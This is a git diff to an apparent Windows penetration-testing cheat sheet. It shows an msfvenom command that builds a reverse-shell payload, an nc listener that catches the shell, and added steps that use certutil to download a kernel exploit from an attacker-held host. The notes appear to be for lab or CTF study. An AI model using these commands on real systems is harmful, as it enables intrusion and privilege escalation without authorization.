@@ -36,6 +36,7 @@ netstat - command to get the ports.
 ---
 sc - command to use service control.
 ---
+certutil - command like wget.
 ```
 ## Reverse shell using ftp and meterpreter
 ```
@@ -136,7 +137,13 @@ Lets say that we can so we can use meterpreter with the next command:
 msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f (file extension) > (file name)
 We need to upload the file to the place that it can be uploaded to.
 
-Then we can use run the command ---> nc -lvnp $PORT
+Then we can run the command ---> nc -lvnp $PORT
 
 We will get a connection without using meterpreter.
+
+Now lets get systeminfo and lets find an exploit for the kernel version.
+
+we found our kernel exploit lets find a writtable place and upload it to the windows shell with the next command:
+
+certutil -urlcache -f http://X.X.X.X/file_name
 ```
